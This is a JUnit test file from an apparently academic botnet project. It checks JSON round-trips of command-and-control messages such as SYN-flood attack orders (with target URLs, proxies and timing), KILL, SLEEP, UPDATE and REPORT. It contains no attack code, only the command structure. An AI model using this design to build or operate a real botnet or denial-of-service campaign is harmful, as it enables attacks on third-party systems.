/*
  The MIT License (MIT)

  Copyright (c) 2016 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.core.control;

import com.acmutv.botnet.core.attack.SynFloodAttack;
import com.acmutv.botnet.core.control.command.BotCommand;
import com.acmutv.botnet.core.control.command.CommandScope;
import com.acmutv.botnet.core.control.command.serial.BotCommandJsonMapper;
import com.acmutv.botnet.tool.net.HttpMethod;
import com.acmutv.botnet.tool.net.HttpProxy;
import com.acmutv.botnet.tool.time.Interval;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.Assert;
import org.junit.Test;

import java.io.IOException;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.concurrent.TimeUnit;

/**
 * JUnit tests for {@link BotCommand} serialization.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 * @see BotCommand
 * @see BotCommandJsonMapper
 */
public class BotCommandSerializationTest {

  /**
   * Tests {@link BotCommand} serialization/deserialization.
   * Command: ATTACK_SYNFLOOD | Delay: not provided | Report: not provided
   * @throws IOException when command cannot be serialized/deserialized.
   */
  @Test
  public void test_attackHttp() throws IOException {
    BotCommand cmdExpected = new BotCommand(CommandScope.ATTACK_SYNFLOOD);
    List<SynFloodAttack> attacks = new ArrayList<>();
    attacks.add(new SynFloodAttack(new URL("http://www.gmarciani.com")));
    attacks.add(new SynFloodAttack(new URL("http://www.gmarciani.com"),
        new HttpProxy("192.168.0.1", 8080)));
    attacks.add(new SynFloodAttack(new URL("http://www.gmarciani.com"),
        new HttpProxy("192.168.0.1", 8080),
        3,
        new Interval(10, 15, TimeUnit.SECONDS)
    ));
    cmdExpected.getParams().put("attacks", attacks);
    ObjectMapper mapper = new BotCommandJsonMapper();
    String jsonActual = mapper.writeValueAsString(cmdExpected);
    BotCommand cmdActual = mapper.readValue(jsonActual, BotCommand.class);
    Assert.assertEquals(cmdExpected, cmdActual);
  }

  /**
   * Tests {@link BotCommand} serialization/deserialization.
   * Command: ATTACK_SYNFLOOD | Delay: provided | Report: not provided
   * @throws IOException when command cannot be serialized/deserialized.
   */
  @Test
  public void test_attackHttp_delay() throws IOException {
    BotCommand cmdExpected = new BotCommand(CommandScope.ATTACK_SYNFLOOD);
    List<SynFloodAttack> attacks = new ArrayList<>();
    attacks.add(new SynFloodAttack(new URL("http://www.gmarciani.com")));
    attacks.add(new SynFloodAttack(new URL("http://www.gmarciani.com"),
        new HttpProxy("192.168.0.1", 8080)));
    attacks.add(new SynFloodAttack(new URL("http://www.gmarciani.com"),
        new HttpProxy("192.168.0.1", 8080),
        3,
        new Interval(10, 15, TimeUnit.SECONDS)
    ));
    cmdExpected.getParams().put("attacks", attacks);
    cmdExpected.getParams().put("delay", new Interval(10, 15, TimeUnit.SECONDS));
    ObjectMapper mapper = new BotCommandJsonMapper();
    String jsonActual = mapper.writeValueAsString(cmdExpected);
    BotCommand cmdActual = mapper.readValue(jsonActual, BotCommand.class);
    Assert.assertEquals(cmdExpected, cmdActual);
  }

  /**
   * Tests {@link BotCommand} serialization/deserialization.
   * Command: ATTACK_SYNFLOOD | Delay: provided | Report: provided
   * @throws IOException when command cannot be serialized/deserialized.
   */
  @Test
  public void test_attackHttp_delayReport() throws IOException {
    BotCommand cmdExpected = new BotCommand(CommandScope.ATTACK_SYNFLOOD);
    List<SynFloodAttack> attacks = new ArrayList<>();
    attacks.add(new SynFloodAttack(new URL("http://www.gmarciani.com")));
    attacks.add(new SynFloodAttack(new URL("http://www.gmarciani.com"),
        new HttpProxy("192.168.0.1", 8080)));
    attacks.add(new SynFloodAttack(new URL("http://www.gmarciani.com"),
        new HttpProxy("192.168.0.1", 8080),
        3,
        new Interval(10, 15, TimeUnit.SECONDS)
    ));
    cmdExpected.getParams().put("attacks", attacks);
    cmdExpected.getParams().put("delay", new Interval(10, 15, TimeUnit.SECONDS));
    cmdExpected.getParams().put("report", true);
    ObjectMapper mapper = new BotCommandJsonMapper();
    String jsonActual = mapper.writeValueAsString(cmdExpected);
    BotCommand cmdActual = mapper.readValue(jsonActual, BotCommand.class);
    Assert.assertEquals(cmdExpected, cmdActual);
  }

  /**
   * Tests {@link BotCommand} serialization/deserialization.
   * Command: CALMDOWN | Wait: not provided | Delay: not provived | Report: not provided
   * @throws IOException when command cannot be serialized/deserialized.
   */
  @Test
  public void test_calmdown() throws IOException {
    BotCommand cmdExpected = new BotCommand(CommandScope.CALMDOWN);
    ObjectMapper mapper = new BotCommandJsonMapper();
    String jsonActual = mapper.writeValueAsString(cmdExpected);
    BotCommand cmdActual = mapper.readValue(jsonActual, BotCommand.class);
    Assert.assertEquals(cmdExpected, cmdActual);
  }

  /**
   * Tests {@link BotCommand} serialization/deserialization.
   * Command: CALMDOWN | Wait: provided | Delay: not provived | Report: not provided
   * @throws IOException when command cannot be serialized/deserialized.
   */
  @Test
  public void test_calmdown_wait() throws IOException {
    BotCommand cmdExpected = new BotCommand(CommandScope.CALMDOWN);
    ObjectMapper mapper = new BotCommandJsonMapper();
    cmdExpected.getParams().put("wait", true);
    String jsonActual = mapper.writeValueAsString(cmdExpected);
    BotCommand cmdActual = mapper.readValue(jsonActual, BotCommand.class);
    Assert.assertEquals(cmdExpected, cmdActual);
  }

  /**
   * Tests {@link BotCommand} serialization/deserialization.
   * Command: CALMDOWN | Wait: provided | Delay: provived | Report: not provided
   * @throws IOException when command cannot be serialized/deserialized.
   */
  @Test
  public void test_calmdown_waitDelay() throws IOException {
    BotCommand cmdExpected = new BotCommand(CommandScope.CALMDOWN);
    cmdExpected.getParams().put("wait", true);
    cmdExpected.getParams().put("delay", new Interval(10, 15, TimeUnit.SECONDS));
    ObjectMapper mapper = new BotCommandJsonMapper();
    String jsonActual = mapper.writeValueAsString(cmdExpected);
    BotCommand cmdActual = mapper.readValue(jsonActual, BotCommand.class);
    Assert.assertEquals(cmdExpected, cmdActual);
  }

  /**
   * Tests {@link BotCommand} serialization/deserialization.
   * Command: CALMDOWN | Wait: provided | Delay: provived | Report: provided
   * @throws IOException when command cannot be serialized/deserialized.
   */
  @Test
  public void test_calmdown_waitDelayReport() throws IOException {
    BotCommand cmdExpected = new BotCommand(CommandScope.CALMDOWN);
    cmdExpected.getParams().put("wait", true);
    cmdExpected.getParams().put("delay", new Interval(10, 15, TimeUnit.SECONDS));
    cmdExpected.getParams().put("report", true);
    ObjectMapper mapper = new BotCommandJsonMapper();
    String jsonActual = mapper.writeValueAsString(cmdExpected);
    BotCommand cmdActual = mapper.readValue(jsonActual, BotCommand.class);
    Assert.assertEquals(cmdExpected, cmdActual);
  }

  /**
   * Tests {@link BotCommand} serialization/deserialization.
   * Command: empty
   * @throws IOException when command cannot be serialized/deserialized.
   */
  @SuppressWarnings("ConstantConditions")
  @Test
  public void test_empty() throws IOException {
    BotCommand cmdExpected = null;
    ObjectMapper mapper = new BotCommandJsonMapper();
    String jsonActual = mapper.writeValueAsString(cmdExpected);
    BotCommand cmdActual = mapper.readValue(jsonActual, BotCommand.class);
    Assert.assertEquals(cmdExpected, cmdActual);
  }

  /**
   * Tests {@link BotCommand} serialization/deserialization.
   * Command: KILL | Wait: not provided | Delay: not provived | Report: not provided
   * @throws IOException when command cannot be serialized/deserialized.
   */
  @Test
  public void test_kill() throws IOException {
    BotCommand cmdExpected = new BotCommand(CommandScope.KILL);
    ObjectMapper mapper = new BotCommandJsonMapper();
    String jsonActual = mapper.writeValueAsString(cmdExpected);
    BotCommand cmdActual = mapper.readValue(jsonActual, BotCommand.class);
    Assert.assertEquals(cmdExpected, cmdActual);
  }

  /**
   * Tests {@link BotCommand} serialization/deserialization.
   * Command: KILL | Wait: provided | Delay: not provived | Report: not provided
   * @throws IOException when command cannot be serialized/deserialized.
   */
  @Test
  public void test_kill_wait() throws IOException {
    BotCommand cmdExpected = new BotCommand(CommandScope.KILL);
    cmdExpected.getParams().put("wait", true);
    ObjectMapper mapper = new BotCommandJsonMapper();
    String jsonActual = mapper.writeValueAsString(cmdExpected);
    BotCommand cmdActual = mapper.readValue(jsonActual, BotCommand.class);
    Assert.assertEquals(cmdExpected, cmdActual);
  }

  /**
   * Tests {@link BotCommand} serialization/deserialization.
   * Command: KILL | Wait: provided | Delay: provived | Report: not provided
   * @throws IOException when command cannot be serialized/deserialized.
   */
  @Test
  public void test_kill_waitdelay() throws IOException {
    BotCommand cmdExpected = new BotCommand(CommandScope.KILL);
    cmdExpected.getParams().put("wait", true);
    cmdExpected.getParams().put("delay", new Interval(10, 15, TimeUnit.SECONDS));
    ObjectMapper mapper = new BotCommandJsonMapper();
    String jsonActual = mapper.writeValueAsString(cmdExpected);
    BotCommand cmdActual = mapper.readValue(jsonActual, BotCommand.class);
    Assert.assertEquals(cmdExpected, cmdActual);
  }

  /**
   * Tests {@link BotCommand} serialization/deserialization.
   * Command: KILL | Wait: provided | Delay: provived | Report: provided
   * @throws IOException when command cannot be serialized/deserialized.
   */
  @Test
  public void test_kill_waitdelayReport() throws IOException {
    BotCommand cmdExpected = new BotCommand(CommandScope.KILL);
    cmdExpected.getParams().put("wait", true);
    cmdExpected.getParams().put("delay", new Interval(10, 15, TimeUnit.SECONDS));
    cmdExpected.getParams().put("report", true);
    ObjectMapper mapper = new BotCommandJsonMapper();
    String jsonActual = mapper.writeValueAsString(cmdExpected);
    BotCommand cmdActual = mapper.readValue(jsonActual, BotCommand.class);
    Assert.assertEquals(cmdExpected, cmdActual);
  }

  /**
   * Tests {@link BotCommand} serialization/deserialization.
   * Command: NONE
   * @throws IOException when command cannot be serialized/deserialized.
   */
  @Test
  public void test_none() throws IOException {
    BotCommand cmdExpected = new BotCommand();
    ObjectMapper mapper = new BotCommandJsonMapper();
    String jsonActual = mapper.writeValueAsString(cmdExpected);
    BotCommand cmdActual = mapper.readValue(jsonActual, BotCommand.class);
    Assert.assertEquals(cmdExpected, cmdActual);
  }

  /**
   * Tests {@link BotCommand} serialization/deserialization.
   * Command: REPORT | Delay: not provided
   * @throws IOException when command cannot be serialized/deserialized.
   */
  @Test
  public void test_report() throws IOException {
    BotCommand cmdExpected = new BotCommand(CommandScope.REPORT);
    ObjectMapper mapper = new BotCommandJsonMapper();
    String jsonActual = mapper.writeValueAsString(cmdExpected);
    BotCommand cmdActual = mapper.readValue(jsonActual, BotCommand.class);
    Assert.assertEquals(cmdExpected, cmdActual);
  }

  /**
   * Tests {@link BotCommand} serialization/deserialization.
   * Command: REPORT | Delay: provided
   * @throws IOException when command cannot be serialized/deserialized.
   */
  @Test
  public void test_report_delay() throws IOException {
    BotCommand cmdExpected = new BotCommand(CommandScope.REPORT);
    cmdExpected.getParams().put("delay", new Interval(10, 15, TimeUnit.SECONDS));
    ObjectMapper mapper = new BotCommandJsonMapper();
    String jsonActual = mapper.writeValueAsString(cmdExpected);
    BotCommand cmdActual = mapper.readValue(jsonActual, BotCommand.class);
    Assert.assertEquals(cmdExpected, cmdActual);
  }

  /**
   * Tests {@link BotCommand} serialization/deserialization.
   * Command: RESTART | Wait: not provided | Delay: not provided | Report: not provided
   * @throws IOException when command cannot be serialized/deserialized.
   */
  @Test
  public void test_restart() throws IOException {
    BotCommand cmdExpected = new BotCommand(CommandScope.RESTART);
    cmdExpected.getParams().put("resource", "Custom");
    ObjectMapper mapper = new BotCommandJsonMapper();
    String jsonActual = mapper.writeValueAsString(cmdExpected);
    BotCommand cmdActual = mapper.readValue(jsonActual, BotCommand.class);
    Assert.assertEquals(cmdExpected, cmdActual);
  }

  /**
   * Tests {@link BotCommand} serialization/deserialization.
   * Command: RESTART | Wait: provided | Delay: not provided | Report: not provided
   * @throws IOException when command cannot be serialized/deserialized.
   */
  @Test
  public void test_restart_wait() throws IOException {
    BotCommand cmdExpected = new BotCommand(CommandScope.RESTART);
    cmdExpected.getParams().put("resource", "Custom");
    cmdExpected.getParams().put("wait", true);
    ObjectMapper mapper = new BotCommandJsonMapper();
    String jsonActual = mapper.writeValueAsString(cmdExpected);
    BotCommand cmdActual = mapper.readValue(jsonActual, BotCommand.class);
    Assert.assertEquals(cmdExpected, cmdActual);
  }

  /**
   * Tests {@link BotCommand} serialization/deserialization.
   * Command: RESTART | Wait: provided | Delay: provided | Report: not provided
   * @throws IOException when command cannot be serialized/deserialized.
   */
  @Test
  public void test_restart_waitDelay() throws IOException {
    BotCommand cmdExpected = new BotCommand(CommandScope.RESTART);
    cmdExpected.getParams().put("resource", "Custom");
    cmdExpected.getParams().put("wait", true);
    cmdExpected.getParams().put("delay", new Interval(10, 15, TimeUnit.SECONDS));
    ObjectMapper mapper = new BotCommandJsonMapper();
    String jsonActual = mapper.writeValueAsString(cmdExpected);
    BotCommand cmdActual = mapper.readValue(jsonActual, BotCommand.class);
    Assert.assertEquals(cmdExpected, cmdActual);
  }

  /**
   * Tests {@link BotCommand} serialization/deserialization.
   * Command: RESTART | Wait: provided | Delay: provided | Report: provided
   * @throws IOException when command cannot be serialized/deserialized.
   */
  @Test
  public void test_restart_waitDelayReport() throws IOException {
    BotCommand cmdExpected = new BotCommand(CommandScope.RESTART);
    cmdExpected.getParams().put("resource", "Custom");
    cmdExpected.getParams().put("wait", true);
    cmdExpected.getParams().put("delay", new Interval(10, 15, TimeUnit.SECONDS));
    cmdExpected.getParams().put("report", true);
    ObjectMapper mapper = new BotCommandJsonMapper();
    String jsonActual = mapper.writeValueAsString(cmdExpected);
    BotCommand cmdActual = mapper.readValue(jsonActual, BotCommand.class);
    Assert.assertEquals(cmdExpected, cmdActual);
  }

  /**
   * Tests {@link BotCommand} serialization/deserialization.
   * Command: ASLEEP | Timeout: not provided | Delay: not provided | Report: not provided
   * @throws IOException when command cannot be serialized/deserialized.
   */
  @Test
  public void test_sleep() throws IOException {
    BotCommand cmdExpected = new BotCommand(CommandScope.SLEEP);
    ObjectMapper mapper = new BotCommandJsonMapper();
    String jsonActual = mapper.writeValueAsString(cmdExpected);
    BotCommand cmdActual = mapper.readValue(jsonActual, BotCommand.class);
    Assert.assertEquals(cmdExpected, cmdActual);
  }

  /**
   * Tests {@link BotCommand} serialization/deserialization.
   * Command: ASLEEP | Timeout: provided | Delay: not provided | Report: not provided
   * @throws IOException when command cannot be serialized/deserialized.
   */
  @Test
  public void test_sleep_timeout() throws IOException {
    BotCommand cmdExpected = new BotCommand(CommandScope.SLEEP);
    cmdExpected.getParams().put("timeout", new Interval(10, 15, TimeUnit.MINUTES));
    ObjectMapper mapper = new BotCommandJsonMapper();
    String jsonActual = mapper.writeValueAsString(cmdExpected);
    BotCommand cmdActual = mapper.readValue(jsonActual, BotCommand.class);
    Assert.assertEquals(cmdExpected, cmdActual);
  }

  /**
   * Tests {@link BotCommand} serialization/deserialization.
   * Command: ASLEEP | Timeout: provided | Delay: provided | Report: not provided
   * @throws IOException when command cannot be serialized/deserialized.
   */
  @Test
  public void test_sleep_timeoutDelay() throws IOException {
    BotCommand cmdExpected = new BotCommand(CommandScope.SLEEP);
    cmdExpected.getParams().put("timeout", new Interval(10, 15, TimeUnit.MINUTES));
    cmdExpected.getParams().put("delay", new Interval(10, 15, TimeUnit.SECONDS));
    ObjectMapper mapper = new BotCommandJsonMapper();
    String jsonActual = mapper.writeValueAsString(cmdExpected);
    BotCommand cmdActual = mapper.readValue(jsonActual, BotCommand.class);
    Assert.assertEquals(cmdExpected, cmdActual);
  }

  /**
   * Tests {@link BotCommand} serialization/deserialization.
   * Command: ASLEEP | Timeout: provided | Delay: provided | Report: provided
   * @throws IOException when command cannot be serialized/deserialized.
   */
  @Test
  public void test_sleep_timeoutDelayReport() throws IOException {
    BotCommand cmdExpected = new BotCommand(CommandScope.SLEEP);
    cmdExpected.getParams().put("timeout", new Interval(10, 15, TimeUnit.MINUTES));
    cmdExpected.getParams().put("delay", new Interval(10, 15, TimeUnit.MINUTES));
    cmdExpected.getParams().put("report", true);
    ObjectMapper mapper = new BotCommandJsonMapper();
    String jsonActual = mapper.writeValueAsString(cmdExpected);
    BotCommand cmdActual = mapper.readValue(jsonActual, BotCommand.class);
    Assert.assertEquals(cmdExpected, cmdActual);
  }

  /**
   * Tests {@link BotCommand} serialization/deserialization.
   * Command: UPDATE | Delay: provided | Report: not provided
   * @throws IOException when command cannot be serialized/deserialized.
   */
  @Test
  public void test_update_delay() throws IOException {
    BotCommand cmdExpected = new BotCommand(CommandScope.UPDATE);
    cmdExpected.getParams().put("settings", new HashMap<String,String>(){{put("prop1","val1");}});
    cmdExpected.getParams().put("delay", new Interval(10, 15, TimeUnit.SECONDS));
    ObjectMapper mapper = new BotCommandJsonMapper();
    String jsonActual = mapper.writeValueAsString(cmdExpected);
    BotCommand cmdActual = mapper.readValue(jsonActual, BotCommand.class);
    Assert.assertEquals(cmdExpected, cmdActual);
  }

  /**
   * Tests {@link BotCommand} serialization/deserialization.
   * Command: UPDATE | Delay: provided | Report: provided
   * @throws IOException when command cannot be serialized/deserialized.
   */
  @Test
  public void test_update_delayReport() throws IOException {
    BotCommand cmdExpected = new BotCommand(CommandScope.UPDATE);
    cmdExpected.getParams().put("settings", new HashMap<String,String>(){{put("prop1","val1");}});
    cmdExpected.getParams().put("delay", new Interval(10, 15, TimeUnit.SECONDS));
    cmdExpected.getParams().put("report", true);
    ObjectMapper mapper = new BotCommandJsonMapper();
    String jsonActual = mapper.writeValueAsString(cmdExpected);
    BotCommand cmdActual = mapper.readValue(jsonActual, BotCommand.class);
    Assert.assertEquals(cmdExpected, cmdActual);
  }

  /**
   * Tests {@link BotCommand} serialization/deserialization.
   * Command: WAKEUP | Delay: not provided | Report: not provided
   * @throws IOException when command cannot be serialized/deserialized.
   */
  @Test
  public void test_wakeup() throws IOException {
    BotCommand cmdExpected = new BotCommand(CommandScope.WAKEUP);
    ObjectMapper mapper = new BotCommandJsonMapper();
    String jsonActual = mapper.writeValueAsString(cmdExpected);
    BotCommand cmdActual = mapper.readValue(jsonActual, BotCommand.class);
    Assert.assertEquals(cmdExpected, cmdActual);
  }

  /**
   * Tests {@link BotCommand} serialization/deserialization.
   * Command: WAKEUP | Delay: provided | Report: not provided
   * @throws IOException when command cannot be serialized/deserialized.
   */
  @Test
  public void test_wakeup_delay() throws IOException {
    BotCommand cmdExpected = new BotCommand(CommandScope.WAKEUP);
    cmdExpected.getParams().put("delay", new Interval(10, 15, TimeUnit.SECONDS));
    ObjectMapper mapper = new BotCommandJsonMapper();
    String jsonActual = mapper.writeValueAsString(cmdExpected);
    BotCommand cmdActual = mapper.readValue(jsonActual, BotCommand.class);
    Assert.assertEquals(cmdExpected, cmdActual);
  }

  /**
   * Tests {@link BotCommand} serialization/deserialization.
   * Command: WAKEUP | Delay: provided | Report: provided
   * @throws IOException when command cannot be serialized/deserialized.
   */
  @Test
  public void test_wakeup_delayReport() throws IOException {
    BotCommand cmdExpected = new BotCommand(CommandScope.WAKEUP);
    cmdExpected.getParams().put("delay", new Interval(10, 15, TimeUnit.SECONDS));
    cmdExpected.getParams().put("report", true);
    ObjectMapper mapper = new BotCommandJsonMapper();
    String jsonActual = mapper.writeValueAsString(cmdExpected);
    BotCommand cmdActual = mapper.readValue(jsonActual, BotCommand.class);
    Assert.assertEquals(cmdExpected, cmdActual);
  }

}
